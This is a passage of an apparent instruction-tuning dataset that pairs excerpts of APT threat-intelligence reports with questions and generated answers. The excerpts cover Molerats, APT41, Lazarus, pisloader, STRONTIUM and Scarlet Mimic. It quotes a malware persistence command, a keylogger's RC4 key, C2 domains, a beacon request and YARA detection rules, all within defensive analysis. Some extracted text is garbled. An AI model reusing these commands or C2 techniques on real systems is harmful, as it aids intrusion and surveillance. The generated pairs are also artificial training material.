It's also worth noting that this IP address is no longer showing any content which could mean it's been taken offline.\nMedium Headline: 45.32.13.169\nIn this graph, the gray blocks indicate that no activity was captured for a majority of the time. Starting November 9th, the actors introduced four unique, registered domains before then adding dynamic DNS providers. What's most interesting about this IP address is that the content for both dynamic DNS urls and registered domains lead to the same download page that hosts a Windows executable. It's unclear why the attackers continue to use both, but the move from registered domains to also using dynamic DNS domains could suggest the actors are beginning to wise up. The use of dynamic DNS infrastructure makes attribution and tracking more difficult as a dynamic DNS domain could be shared by unrelated parties.\nMedium Headline: Gaza Strip origins\nOnly one sample \u2013 aa288a5cbf4c897ff02238e851875660 \u2013 was uploaded to VirusTotal, shortly after it was compiled. Less than a minute and a half elapsed between compilation on August 8th 2015 at 10:31:12 and the first VirusTotal submission at 10:32:24. This sample was uploaded from Gaza.\nThe very short time frame between compilation and VirusTotal submission could indicate that the attacker is the one who has submitted the sample \u2013 in order to learn whether antivirus engines detect it.\n1\n1\n14 All attribution data in the table are taken from .\nMedium Headline: Individuals\nRecent samples had \"Last Saved By\" properties of the document point to a specific individual who we believe is one of the attackers. In his Social media accounts this individual defines himself as a Software Engineer who lives in Gaza. Public interactions on his YouTube page (such as videos he liked) are related to hacking tools and methods. We have decided not to disclose this individual's name in the public report.\n1\n1\n17 CITYNET \u2014 City Net Informatics, Internet and Communication Technologies and General Trade Ltd. (PS)\nBig Headline: Appendix A - Malicious email messages and lures\nBelow we present email and lure documents that were used in the campaign.\nSaudi Arabia boosts security on Yemen border\nGreek coastguard appears to sink refugee boat.exe\nUS delegation heading to Israel to discuss Iran terror funding eea2e86f06400f29a2eb0c40b5fc89a6\nSupermodel Bar Refaeli Stars in Israeli Spy Movie.exe\nISIS leader raped the American captive\nThe Truth About Your Sexual Peak , Don't worry\n\u0628\u0633\u0623\u0627\u0628 \u0641\u0631 \u0639 \u0627\u0635\u062d\u0644\u0646\u0627\u0629 \u0627\u0644\u062f\u0628\u0644\u0648\u0645\u064a\u0633\u0627\u0629 \u0646\u0639 \u0627\u0633\u0644\u064a\u0633\u064a \u062a\u062d\u0627\u0648\u0645\u0627\u0644 \u0639\u0627\u0642\u062a\u0627\u0647\u0644 \u0641 \u064a \u0646\u0644\u062f\u0646\n.exe\n(the reasons for lifting A-Sisi's diplomatic immunity and the possibility of his arrest in London)\nGoogle-Privacy.doc\nInvoice details.doc\nf94dfd49142bdae4a525997e4c0b944c\n\u0628\u0623\u0632\u0631 \u0645\u0627 \u062e\u064a \u0635 \u0635\u0645 \u0631 \u064a\u0641 \u062a \u064a\u0631\u0633\u0628\u0627\u062a \u0627\u062e\u0644\u0631\u0627\u0629\u064a\u062c \u0627\u0639\u0633\u0644\u0648\u064a\u062f\u0629\n(Highlights of matters attributed by Egypt to the leaks from the Saudi foreign service)\n\u0627\u062a\u0645\u0644\u0647\u0645 \u0627 \u0644\u062d\u0642\u064a\u0642\u064a \u064a\u0641 \u0631\u0638\u0646 \u0631 \u064a\u0633\u0648\u0627 \u0628 \u0629\u064a\u0636\u0642 \u0627\u0637\u0644\u0626\u0627\u0631\u0629 \u0627 \u062a\u0644\u064a \u0623 \u0637\u0642\u0633\u062a \u064a\u0641 \u0646\u064a\u0633 \u0621\u0627\n(Translation: \"the real culprit behind the plane crash in Sinai, according to Russia\")\n\u05e8\u05d0\u05d4\n\u05d1 \u05d7\u05e4\u05e9\u05d5\u05ea \u05d5\u05e1\u05d5\u05d3\u05ea \u05d4\u05d0\u05d8\u05dd\u05d5 \u05e9 \u05dc \u05d9\u05e8\u05e9\u05d0\u05dc\n\"\n18\n(The USA reveals Israel's nuclear secrets)\n\u05ea\u05d0\n. preposition accusative the ofomission\u2013error  syntax  a includes titleThe18\n\u00a9 Clearsky - Cyber security.\nSpy vs. Spy: Inside the Fraying U.S.-Israel Ties.exe\n\u05d4\u05e9\u05de\u05d8\u05e8\u05d4 \u05d5\u05d1\u05d3\u05ea\u05e7 \u05e9\u05d7\u05d3 \u05de\u05dc\u05e1\u05ea\u05e8\u05d9 \u05de\u05de\u05e1\u05d9\u05db\u05dd \u05d9\u05d9\u05d3\u05d5\u05e1\u05dd\n\nHow does the short time frame between the compilation of a malware sample and its submission to VirusTotal indicate the actions of the attacker? What preventive measures can be taken based on this observation?",
    "output": "The short time frame between the compilation of a malware sample and its submission to VirusTotal indicates that the attacker likely submitted the sample themselves to check if it is detected by antivirus engines. This behavior suggests that the attacker is testing the effectiveness of their malware. Preventive measures based on this observation include monitoring VirusTotal submissions for newly compiled samples, especially those originating from regions associated with the attackers, such as Gaza. Early detection and analysis of these samples can help in proactively updating antivirus signatures and improving overall security posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Outlook\nThis activity is one of the most widespread campaigns we have seen from China-nexus espionage actors in recent years. While APT41 has previously conducted activity with an extensive initial entry such as the trojanizing of NetSarang software, this scanning and exploitation has focused on a subset of our customers, and seems to reveal a high operational tempo and wide collection requirements for APT41.\nIt is notable that we have only seen these exploitation attempts leverage publicly available malware such as Cobalt Strike and Meterpreter. While these backdoors are full featured, in previous incidents APT41 has waited to deploy more advanced malware until they have fully understood where they were and carried out some initial reconnaissance. In 2020, APT41 continues to be one of the most prolific threats that FireEye currently tracks. This new activity from this group shows how resourceful and how quickly they can leverage newly disclosed vulnerabilities to their advantage.\nPreviously, (<https://www.fireeye.com/mandiant/managed-detection-and-response.html>)FireEye Mandiant Managed Defense identified APT41 successfully leverage CVE-2019-3396 (Atlassian Confluence) against a U.S. based university. While APT41 is a (<https://content.fireeye.com/apt-41/rpt-apt41/>)unique state-sponsored Chinese threat group that conducts espionage, the actor also conducts financially motivated activity for personal gain.\nBig Headline: Appendix A: Discovery Rules\nThe following Yara rules serve as examples of discovery rules for APT41 actor TTPs, turning the adversary methods or tradecraft into new haystacks for purposes of detection or hunting. For all tradecraft-based discovery rules, we recommend deliberate testing and tuning prior to implementation in any production system. Some of these rules are\ntailored to build concise haystacks that are easy to review for high-fidelity detections. Some of these rules are broad in aperture that build larger haystacks for further automation or processing in threat hunting systems.\nimport \"pe\"\nrule ExportEngine_APT41_Loader_String\n{\nmeta:\nauthor = \"@stvemillertime\"\ndescription \"This looks for a common APT41 Export DLL name in BEACON shellcode loaders, such as loader_X86_svchost.dll\"\nstrings:\n$pcre = /loader_[\\x00-\\x7F]{1,}\\x00/\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))\n}\nrule ExportEngine_ShortName\n{\nmeta:\nauthor = \"@stvemillertime\"\ndescription = \"This looks for Win PEs where Export DLL name is a single character\"\nstrings:\n$pcre = /[A-Za-z0-9]{1}\\.(dll|exe|dat|bin|sys)/\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address)\n+ 12))\n}\nrule ExportEngine_xArch\n{\nmeta:\nauthor = \"@stvemillertime\"         description = \"This looks for Win PEs where Export DLL name is a something like x32.dat\"\nstrings:\n$pcre = /[\\x00-\\x7F]{1,}x(32|64|86)\\.dat\\x00/             condition:              uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12))\n}\nrule RareEquities_LibTomCrypt\n{\nmeta:\nauthor = \"@stvemillertime\"\ndescription = \"This looks for executables with strings from LibTomCrypt as seen by some APT41-esque actors https://github.com/libtom/libtomcrypt - might catch everything BEACON as well. You may want to exclude Golang and UPX packed samples.\"\nstrings:\n$a1 = \"LibTomMath\"\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $a1\n}\nrule RareEquities_KCP\n{\nmeta:\nauthor = \"@stvemillertime\"\ndescription = \"This is a wide catchall rule looking for executables with equities for a transport library called KCP, https://github.com/skywind3000/kcp Matches on this rule may have built-in KCP transport ability.\"\nstrings:\n$a01 = \"[RO] %ld bytes\"\n$a02 = \"recv sn=%lu\"\n$a03 = \"[RI] %d bytes\"\n$a04 = \"input ack: sn=%lu rtt=%ld rto=%ld\"\n$a05 = \"input psh: sn=%lu ts=%lu\"\n$a06 = \"input probe\"\n$a07 = \"input wins: %lu\"\n\nHow can the provided YARA rules help cybersecurity experts detect and mitigate APT41 activities, and what specific characteristics of APT41's tactics, techniques, and procedures (TTPs) do these rules target?",
    "output": "A: The provided YARA rules serve as examples of discovery rules for APT41 actor TTPs, turning the adversary methods or tradecraft into new haystacks for purposes of detection or hunting. These rules help cybersecurity experts by providing specific patterns to look for in potentially compromised systems. For example, the 'ExportEngine_APT41_Loader_String' rule looks for a common APT41 Export DLL name in BEACON shellcode loaders, while the 'RareEquities_LibTomCrypt' rule searches for executables with strings from LibTomCrypt, a cryptographic library used by some APT41-esque actors. These rules target specific characteristics such as DLL names, export table entries, and unique strings associated with libraries and transport protocols used by APT41, enabling experts to identify and respond to APT41 activities more effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Malware 10: Keylogger\nMD5: 5ebfe9a9ab9c2c4b200508ae5d91f067\nKnown filenames: NCVlan.dat\nFile size: 73'216 bytes\nType: PE32+ executable (DLL) (GUI) x86-64, for MS Windows\nLink time: 2016.04.06 07:38:57 (GMT)\nLinker version: 10.0\nOriginal name: grep.dll\nUsed in: Incident #1\nThis module is a user-mode keylogger. It contains an export function with an empty name, which has the main functionality of the module.\nUpon starting it creates a new thread, which suggests that it has to be loaded by a custom PE loader (probably by the DLL Injector described in this paper, MD5:\n949e1e35e09b25fca3927d3878d72bf4). The main thread registers a new class named \"Shell TrayCls%RANDOM%\", where %RANDOM% value is an integer returned by the system rand function seeded with the current system time. Next, it creates a window called \"Shell Tray%RANDOM%\". The new window registers a system-wide keyboard hook and starts recording keypresses and Unicode text in context of the clipboard. The data is saved into a current user profile directory in a file that is named after the username via the following template string:\nNTUSER{%USERNAME%}.TxS.blf. For example, the full path that we discovered was \"C:\\Users\\[redacted]\\NTUSER.DAT{[redacted operator]}.TxS.blf\". The data written in the file is encrypted with RC4 with the following hardcoded 64-bytes key:\n53 55 4D A2 30 55 53 44  30 2C 30 3E 27 44 42 54 20 4C 49 4D 49 54 43 55  53 44 30 2C 0D 0A 43 44 54 19 53 55 4D 7F 31 55 53 44 32 36 35 2C 30 E4 37 43 44 54 98 4C 49 4D 49 54 1B 55 53 44 30 2C\nThe RC4 key is not entirely random and seems to contain chunks of readable ASCII text related to some database contents or queries:\n\u25cf \"SUM.0USD0,0>'DBT LIMITCUSD0,..CDT.SUM.1USD265,0.7CDT.LIMIT.USD0,\"\nWe assume this is done to complicate the recognition of a password-like string by eye, or use a value that would cause some false-positives when scanning for such a pattern.\nThe keylogger data file is a binary log that contains sequences of records organized in blocks which have the following events inside:\n1. Session Start (Logon):\nContains username, type of session (rdp, console, etc), session id.\n2. Session Activity:\nContains active windows name and sequence of typed keys.\n3. Session End (Logoff):\nContains username, session id.\nEvery event record contains a DWORD timestamp.\nThe module also starts a watchdog thread that keeps monitoring the creation of a trigger-file called ODBCREP.HLP in the directory of the current DLL. If such file is found, the keylogger removes the keyboard hook and unloads from the process immediately.\n\nWhat is the structure of the keylogger data file created by the Lazarus Group's keylogger module, and how does it organize and store the recorded data? Explain the significance of each type of event recorded.",
    "output": "The keylogger data file created by the Lazarus Group's keylogger module is a binary log that contains sequences of records organized in blocks. Each block includes various types of events, each serving a specific purpose in tracking user activities. The events are: 1. Session Start (Logon): This event contains the username, type of session (such as rdp, console, etc.), and session ID, providing context for when and how the session began. 2. Session Activity: This event captures the active window names and the sequence of typed keys, effectively logging all user interactions during the session. 3. Session End (Logoff): This event records the username and session ID when the session ends, marking the conclusion of the logged activities. Every event record also contains a DWORD timestamp, which helps in chronologically organizing the recorded data. This structured approach ensures that the keylogger can comprehensively track user activities from start to finish, making it easier to reconstruct sessions and extract valuable information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Infrastructure\nThe pisloader malware family was delivered via HTTP from the following URL. At the time of writing, this URL was still active.\nhttp://globalprint-us[.]com/proxy_plugin.exe\nOther samples hosted on this domain include the following:\nhttp://globalprint-us[.]com/proxy_web_plugin.exe\nMD5: E4968C8060EA017B5E5756C16B80B012\nSHA256: 8FFBB7A80EFA9EE79E996ABDE7A95CF8DC6F9A41F9026672A8DBD95539FEA82A Size: 126976 Bytes\nCompile Time: 2016-04-28 00:38:46 UTC\nThis discovered file was found to be an instance of the common Poison Ivy malware family with the following configuration data:\nCommand and Control Address: intranetwabcam[.]com\nCommand and Control Port: 80\nPassword: admin\nMutex: )!VoqA.I5\nThe domains witnessed in this attack were all registered very shortly prior to being used. The following domains have been witnessed in this attack:\nAdditionally, the following IP resolutions have been observed.\nBig Headline: Initial Dropper\nThe following sample was discovered initially and is referenced in the subsequent analysis:\nMD5: E8D58AA76DD97536AC225949A2767E05\nSHA256: DA3261C332E72E4C1641CA0DE439AF280E064B224D950817A11922A8078B11F1 Size: 126976 Bytes\nCompile Time: 2016-04-27 14:37:34 UTC\nThis particular file has the following metadata properties. The references to 'pisload2' led to the naming of this malware family.\nThe initial dropper contains very simple code that is responsible for setting persistence via the Run registry key, and dropping and executing an embedded Windows executable. Limited obfuscation was encountered, where the authors split up strings into smaller sub-strings and used 'strcpy' and \u00e2 \u20ac\u02dcstrcat' calls to re-build them prior to use. They also used this same technique to generate garbage strings that are never used. This is likely to deter detection and analysis of the sample. The following decompiled code demonstrates this. Comments have been added to show the fully-generated strings.\nIn the above decompiled code, we see that the pisloader is generating the following string, which eventually is called to set the Run registry key.\ncmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v lsm /t reg_sz /d \" %appdata%\\lsm.exe\u2020/f\nThis particular command will set the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\lsm registry key with a value of \"%appdata%\\lsm.exe\u00e2\u20ac. After this key is set, the malware proceeds to decrypt a two blobs of data with a single-byte XOR key of 0x54. The resulting data is written to the %appdata%\\lsm.exe file path.\nAfter this file is written, the malware executes the newly written lsm.exe file, which contains the pisloader payload.\nBig Headline: Payload\nThe following sample was discovered and is referenced in the subsequent analysis:\nMD5: 07B9B62FB3B1C068837C188FEFBD5DE9\nSHA256: 456FFFC256422AD667CA023D694494881BAED1496A3067485D56ECC8FEFBFAEB Size: 102400 Bytes\nCompile Timestamp: 2016-04-27 13:39:02 UTC\nThe payload is heavily obfuscated using a return-oriented programming (ROP) technique, as well as a number of garbage assembly instructions. In the example below, code highlighted in red essentially serves no purpose other than to deter reverse-engineering of the sample. This code can be treated as garbage and ignored. The entirety of the function is highlighted in green, where two function offsets are pushed to the stack, followed by a return instruction. This return instruction will point code execution first at the null function, which in turn will point code execution to the 'next_function'. This technique is used throughout the runtime of the payload, making static analysis difficult.\nThe malware is actually quite simplistic once the obfuscation and garbage code is ignored. It will begin by generating a random 10-byte alpha-numeric header. The remaining data is base32-encoded, with padding removed. This data will be used to populate a subdomain that will be used in a subsequent DNS\nrequest for a TXT record.\nThe use of DNS as a C2 protocol has historically not been widely adopted by malware authors. Notable exceptions include the following:\nFrameworkPOS\nC3PRO-RACCOON\nFeederBot\nMorto\nPlugX Variants\nThe use of DNS as a C2 allows pisloader to bypass certain security products that may not be inspecting this traffic correctly.\nThe pisloader sample will send a beacon periodically that is composed of a random 4-byte uppercase string that is used as the payload. An example of this can be found below:\nThe malware expects various aspects of the DNS responses to be set in a specific way, or else pisloader will ignore the DNS reply. The following DNS flags must be set. Should any additional flags be set, the response will be ignored.\nResponse\nRecursion Desired\nRecursion Available\nThe 'Questions' field must be set to a value of 0x1. The 'Answer Resource Records' field must be set to a value of 0x1. Additionally, the response query subdomain must match the original DNS request.\nThe remote command and control (C2) server is statically embedded within the malware. A single host of 'ns1.logitech-usa[.]com' is found in this specific sample.\nThe C2 server will respond with a TXT record that is encoded similar to the initial request. In the response, the first byte is ignored, and the remaining data is base32-encoded. An example of this can be found below.\nThe following commands, and their descriptions are supported by the malware:\nsifo \u00e2\u20ac\" Collect victim system information\ndrive \u00e2\u20ac\" List drives on victim machine\nlist \u00e2\u20ac\" List file information for provided directory\nupload \u00e2\u20ac\" Upload a file to the victim machine\nopen \u00e2\u20ac\" Spawn a command shell\nSome examples of these commands being used can be seen below. A mock DNS server was used to generate the commands and receive the resulting data.\nBig Headline: Conclusion\nThe Wekby group continues to target various high profile organizations using sophisticated malware. The pisloader malware family uses various novel techniques, such as using DNS as a C2 protocol, as well as making use of return-oriented programming and other anti-analysis tactics.\nPalo Alto Networks customers are protected against this threat in the following ways:\nWildFire correctly identifies all pisloader samples as malicious\nA pisloader AutoFocus tag has been created in order to track this malware family\nAll domains/IPs used in this attack have been flagged as malicious.\nAn IPS rule has been created to detect pisloader DNS traffic\n\nExplain how the pisloader malware uses DNS as a command and control (C2) mechanism. What are the advantages of using DNS for C2, and what specific requirements must be met for the DNS responses to be accepted by the malware?",
    "output": "A: The pisloader malware uses DNS as a C2 protocol by sending periodic beacons composed of a random 4-byte uppercase string as the payload. The use of DNS as a C2 protocol allows pisloader to bypass certain security products that may not be inspecting this traffic correctly. The malware expects specific aspects of the DNS responses to be set in a particular way; otherwise, it ignores the DNS reply. The required DNS flags include Response, Recursion Desired, and Recursion Available. The 'Questions' field must be set to a value of 0x1, and the 'Answer Resource Records' field must be set to a value of 0x1. Additionally, the response query subdomain must match the original DNS request. The C2 server responds with a TXT record that is encoded similarly to the initial request, with the first byte ignored and the remaining data base32-encoded. The malware supports commands such as collecting system information, listing drives, listing file information, uploading files, and spawning a command shell.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: STRONTIUM: A profile of a persistent and motivated adversary\nA research team at the Microsoft Malware Protection Center (MMPC) proactively monitors the threat landscape for emerging threats. Part of this job involves keeping tabs on targeted attack groups, which are often the first ones to introduce new exploits and techniques that are later used widely by other attackers. One such group, which Microsoft has code-named STRONTIUM, is of particular interest because of its aggressive, persistent tactics and techniques, and its repeated use of new zero-day exploits to attack its targets. Microsoft is sharing some of the information it has gathered on this prominent attack group in the hope that it will raise awareness of the group's activities and help organizations take immediate advantage of available mitigations that can significantly reduce the risks that they face from this and similar groups.\nMedium Headline: Adversary profile\nSTRONTIUM has been active since at least 2007. Whereas most modern untargeted malware is ultimately profit-oriented, STRONTIUM mainly seeks sensitive information. Its primary institutional targets have included government bodies, diplomatic institutions, and military forces and installations in NATO member states and certain Eastern European countries. Additional targets have included journalists, political advisors, and organizations associated with political activism in central Asia. STRONTIUM is Microsoft's code name for this group, following its internal practice of assigning chemical element names to activity groups; other researchers have used code names such as APT28, 1 Sednit,2 Sofacy,3 and Fancy Bear as labels for a group or groups that have displayed\nactivity similar to the activity observed from STRONTIUM. The group's persistent use of spear phishing tactics and access to previously undiscovered zero-day exploits have made it a highly resilient threat.\n1 APT28: A Window into Russia's Cyber Espionage Operations?, FireEye, Inc., October 14, 2014, (<https://www2.fireeye.com/apt28.html>)https://www2.fireeye.com/apt28.html.\n2 Loucif Kharouni et al., Operation Pawn Storm: Using Decoys to Evade Detection, Trend Micro, October 22, 2014, (<http://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/pawn-storm-espionage-attacks-use-decoys-deliver-sednit>)www.trendmicro.com/vinfo/us/security/news/cyber-attacks/pawn-storm-espionage-attacks-use-(<http://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/pawn-storm-espionage-attacks-use-decoys-deliver-sednit>)decoys-deliver-sednit.\n3 Tactical Intelligence Bulletin: Sofacy Phishing, PwC, October 22, 2014, (<http://pwc.blogs.com/files/tactical-intelligence-bulletin---sofacy-phishing-.pdf>)pwc.blogs.com/files/tactical-(<http://pwc.blogs.com/files/tactical-intelligence-bulletin---sofacy-phishing-.pdf>)intelligence-bulletin---sofacy-phishing-.pdf.\nMedium Headline: How STRONTIUM attacks a target\nSTRONTIUM primarily uses two kinds of attack. It uses spear phishing\u2014phishing attempts targeted at specific individuals\u2014to perform reconnaissance and steal login credentials to gather information about potential high-value targets associated with the institution under attack. Following the reconnaissance phase, it uses a variety of methods to infect the computers of high-value targets with malware, often by exploiting previously unknown vulnerabilities in browser add-ons and other software.\nSmall Headline: Reconnaissance and target identification\nWhereas most modern untargeted malware is ultimately profit-oriented, STRONTIUM mainly seeks sensitive information.\nSTRONTIUM typically begins its attack on an institution by identifying and profiling potential victims with connections to the institution. Microsoft has seen indications that STRONTIUM relies on open-source intelligence (OSINT), such as email lists and information harvested from public forums or social networking sites, to identify targets for spear phishing. Microsoft also believes that STRONTIUM relies on past successful phishing attacks to augment its dataset, by making use of any email communications it can identify between prior targets and the current target.\nSTRONTIUM casts a wide net with its reconnaissance activities, seeking login credentials for email and other systems from a large number of people, which it then weeds through to assess its value. Microsoft believes STRONTIUM used its spear phishing attacks to target several thousand individuals during the first half of 2015. Although STRONTIUM isn't choosy with its targets, it is persistent. When STRONTIUM identifies an individual to target, the group will repeatedly conduct spear phishing attacks against it over a long duration, possibly a year or more, until one of the attempts succeeds.\nSTRONTIUM's spear phishing modus operandi focuses on making the recipient concerned about unauthorized use of an account. A recent attack campaign involved sending messages with the subject line \"Privacy alert\" purporting to originate from a well-known email service, informing the user that their account\nhas been accessed from an unrecognized device in a different country. Because the targeted individuals are often professionals who have access to sensitive information, this can be an effective way to entice users to click a \"change password\" link that actually leads to a webpage under the attacker's control.\nFigure 1. An example of a credential-stealing spear phishing message sent by STRONTIUM\nTypically, the link will lead to a domain name that is similar to a legitimate domain name used by the service in an effort to fool the user into thinking the message is legitimate. (<>)Figure 2 lists some examples.\nFigure 2. Examples of domain names spoofed by STRONTIUM in recent attacks\nIf the attack is successful, STRONTIUM uses the captured credentials to access the victim's email account to identify additional targets and for additional analysis and attacks. Even if the recipient doesn't enter their login credentials\ninto the malicious webpage, the act of clicking the link can provide STRONTIUM with valuable information. In addition to providing STRONTIUM with the recipient's IP address, clicking the link transmits a user-agent string to the web server that typically includes details about the recipient's browser and operating system versions, and sometimes includes information about the browser add-ons the recipient is using. This can provide STRONTIUM with insight into what software is deployed in the organization, and possibly help it plan future drive-by download activities.\nFigure 3. JavaScript is used to collect information about the visitor's browser for drive-by download attacks\n\nQ: What are the primary institutional targets of STRONTIUM, and why are these targets significant in the context of the group's objectives?",
    "output": "A: The primary institutional targets of STRONTIUM include government bodies, diplomatic institutions, and military forces and installations in NATO member states and certain Eastern European countries. Additional targets have included journalists, political advisors, and organizations associated with political activism in central Asia. These targets are significant in the context of the group's objectives because STRONTIUM mainly seeks sensitive information rather than being profit-oriented. By targeting these institutions and individuals, STRONTIUM aims to gather valuable intelligence that can be used for strategic purposes, such as espionage or influencing geopolitical events.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: THE FIDELIS TAKE\nThe techniques documented in this report indicate a level of sophistication that make reverse engineering more difficult and to obscure the intentions of the actor behind this malware. Using Cisco AnyConnect software as a lure continues a pattern of using typical corporate software as a vehicle to infect victim machines.\nThe use of multiple XOR keys and string stacking show the actor is spending great effort to deceive reverse engineers and incident responders. The use of both SSL/TLS and encoded communications show the knowledge many enterprises perform SSL man-in-the-middle decryption of traffic and this provides a layer to hide communications from incident responders. This paper highlights many of these techniques and how we were able to bypass them.\nFidelis Cybersecurity's products detect the activity documented in this paper and additional technical indicators are published in the appendices of this paper and to the Fidelis Cybersecurity github at .\nMedium Headline: File Metadata\nWhen this malicious DLL is executed the Victim system establishes a secure and encrypted connection on port 443 and beacons with the following request (encryption layer removed).\nPOST /-1289335108[COMPUTER_NAME].1a53b0cp32e46g0qio9 HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko\nHost: mail.cbppnews[dot]com\nContent-Length: 8\nConnection: Keep-Alive\nThe following string represents the obfuscated format of the Command & Control (C2) domain:\nThe C2 domain is de-obfuscated using the same code observed in the analysis of the \"75D3D1F23628122A64A2F1B7EF33F5CF\" (malicious DLL payload dropped into the system), but in this case the XOR keys used are different from the sample previously analyzed. The XOR keys used are 0x39 and 0x71.\nBig Headline: YARA:\nUsers are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use. This document cannot be modified or converted to any other electronic or machine-readable form in whole or in part without prior written approval of Fidelis Cybersecurity, Inc. While we have done our best to ensure that the material found in this document is accurate, Fidelis Cybersecurity, Inc. makes no guarantee that the information contained herein is error free.\n\nAnswer this question based on the above context: What strategies does the INOCNATION malware employ to hide its Command and Control (C2) communications from incident responders, and how are these strategies implemented?",
    "output": "The INOCNATION malware uses both SSL/TLS encryption and encoded communications to hide its C2 traffic. This approach is effective because many enterprises perform SSL man-in-the-middle decryption of traffic, and the additional encoding provides an extra layer of protection against detection. For instance, the C2 domain is obfuscated using XOR keys (0x39 and 0x71) that differ from those used in previous samples, adding to the complexity of decoding the communications. This multi-layered approach ensures that the malware's communications remain hidden from incident responders.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nThe better we can understand the threats to our networks and systems, the more effective we will be at preventing those threats. The goal of this report is to help network defenders better understand attacks from a group we have named Scarlet Mimic. This group has been conducting attacks for at least four years using a backdoor Trojan that has been under active development. The group primarily deploys spear\u00adphishing e\u00admails to infect its targets, but was also responsible for a watering hole (strategic web compromise) attack in 2013.\nAttacks from this group have been reported publicly in the past, but mostly as disparate, unconnected incidents. Based on analysis of the data and malware samples we have collected, Unit 42 believes the attacks described herein are the work of a group or set of cooperating groups who have a single mission, collecting information on minority groups who reside in and around northwestern China. In the past, Scarlet Mimic has primarily targeted individuals who belong to these minority groups as well as their supporters, but we've recently found evidence to indicate the group also targets individuals working inside government anti\u00adterrorist organizations. We suspect these targets are selected based on their access to information about the targeted minority groups.\nIn the following sections we will describe selected attacks we have identified and who their likely targets are. We will also provide detailed analysis of the latest variants of the malware they deploy (known as FakeM) as well as other associated tools that allow Scarlet Mimic to target Android and OS X devices.\nAttacks launched by this group were publicly exposed on 2013 in a Trend Micro report about the FakeM Trojan. Since that reports release, Scarlet Mimic has deployed two additional versions of the malware. They have also deployed nine separate \"loader\" Trojans they use to infect systems with their backdoor.\n\nHow does the Scarlet Mimic APT group select its targets, and what are the primary methods it uses to infect these targets? Additionally, how has the group evolved its tactics over time?",
    "output": "A: The Scarlet Mimic APT group primarily selects its targets based on their association with minority groups residing in and around northwestern China, as well as their supporters. Recently, the group has expanded its targeting to include individuals working within government anti-terrorist organizations, likely due to their access to information about the targeted minority groups. The primary method Scarlet Mimic uses to infect its targets is through spear-phishing emails. Additionally, the group was responsible for a watering hole attack in 2013. Over time, Scarlet Mimic has evolved its tactics by developing new versions of its backdoor Trojan, known as FakeM, and deploying multiple loader Trojans to infect systems with their backdoor. Since the public exposure of their activities in a 2013 Trend Micro report, the group has released two additional versions of the FakeM malware and nine separate loader Trojans.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Foreword\nDustySky (called \"NeD Worm\" by its developer) is a multi-stage malware in use since May 2015. It is in use by the Molerats (aka Gaza cybergang), a politically motivated group whose main objective, we believe, is intelligence gathering. Operating since 2012, the group's activity has been reported by Norman 1 , Kaspersky2,3, FireEye4, and PwC5.\nThis report revolves around a campaign that includes a new malware developed by a member of the group or on behalf of the group. Based on dozens of known attacks and the vast infrastructure in use - we estimate that a wave of targeted malicious email messages has been sent on a weekly basis.\nThese attacks are targeted, but not spear-phished. I.e., malicious email messages are sent to selected targets rather than random mass distribution, but are not tailored specifically to each and every target. Dozens of targets may receive the exact same message. The email message and the lure document are written in Hebrew, Arabic or English - depending on the target audience.\nTargeted sectors include governmental and diplomatic institutions, including embassies; companies from the aerospace and defence Industries; financial institutions; journalists; software developers.\nThe attackers have been targeting software developers in general, using a fake website pretending to be a legitimate iOS management software, and linking to it in an online freelancing marketplace.\nMost targets are from the Middle East: Israel, Egypt, Saudi Arabia, United Arab Emirates and Iraq. The United States and countries in Europe are targeted as well.\n\nHow does the DustySky malware, developed by the Molerats (Gaza cybergang), differ from traditional spear-phishing attacks in terms of target selection and message customization? Additionally, explain how this approach impacts the effectiveness and scope of their campaigns.",
    "output": "The DustySky malware, developed by the Molerats (Gaza cybergang), differs from traditional spear-phishing attacks in that it employs a targeted but not spear-phished approach. This means that malicious email messages are sent to selected targets rather than being distributed randomly en masse. However, unlike spear-phishing, these messages are not tailored specifically to each individual target. Instead, dozens of targets may receive the exact same message. The email message and the lure document are written in Hebrew, Arabic, or English, depending on the target audience. This approach allows the attackers to cast a wider net while still maintaining some level of specificity, potentially increasing the likelihood of success without the need for extensive personalization. By targeting multiple individuals with the same message, the attackers can efficiently reach a larger number of potential victims, making their campaigns more scalable and effective.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Explain the components and functionality of the Shamoon/Disttrack malware, including its destructive payload and the methods used to spread and activate it.",
